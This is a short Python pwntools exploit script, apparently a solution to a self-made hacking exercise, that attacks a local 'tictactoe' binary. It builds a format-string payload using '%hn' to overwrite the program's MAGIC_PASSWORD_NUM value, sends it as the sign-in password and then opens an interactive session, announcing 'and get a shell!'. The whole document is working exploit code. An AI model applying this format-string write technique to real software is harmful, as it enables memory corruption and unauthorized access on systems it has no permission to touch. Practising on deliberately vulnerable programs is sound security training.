#first format string
from pwn import *

elf = ELF('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')
conn = process('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')


# important values
write_location = elf.sym.MAGIC_PASSWORD_NUM 
print(f"write location: {p32(write_location)}")
write_value = 100
param_idx = 7
print(f"write_value: {write_value}, param_idx: {param_idx}")

#building payload:
payload = p32(write_location) + f"%0{write_value-4}x%{param_idx}$hn".encode()
print(f"the payload: {payload}")

#interacting with program:
#choose to signin
print(conn.recvuntil("type s:").decode())
conn.sendline("s")

print(conn.recvuntil("Enter your name (should not be more than 10 chars!!):").decode())
conn.sendline("aaa")
print(conn.recvuntil("safe... or is it?):").decode())
print("seding malicious password...")
conn.sendline(payload)
print("and get a shell!")
conn.interactive()
